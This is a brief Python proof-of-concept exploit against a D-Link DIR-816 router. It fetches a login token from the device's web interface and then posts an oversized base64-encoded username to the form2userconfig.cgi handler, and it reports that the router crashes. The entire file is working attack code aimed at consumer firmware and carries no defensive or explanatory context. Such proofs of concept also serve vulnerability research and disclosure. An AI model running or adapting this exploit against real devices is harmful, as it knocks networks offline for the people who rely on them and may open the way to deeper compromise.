# coding=utf-8
import requests
import re
import base64

ip = "192.168.0.1"
payload = base64.b64encode('a'*0x150)
print(len(payload))

print("[+]Get tokenid")
url = "http://{}/dir_login.asp".format(ip)
rsp = requests.get(url)

pattern = re.compile(r'name="tokenid"  value="\d+"')
result = pattern.findall(rsp.text)
tokenid = result[0].split('value="')[-1].strip('"')
print("[+]tokenid:{}".format(tokenid))

url = "http://{}/goform/form2userconfig.cgi".format(ip)
data = {"username": payload, "newpass": '', "tokenid": tokenid}
try:
    requests.post(url, data=data, allow_redirects=False, timeout=1)
except:
    pass
print("[+]DIR816 Crash")

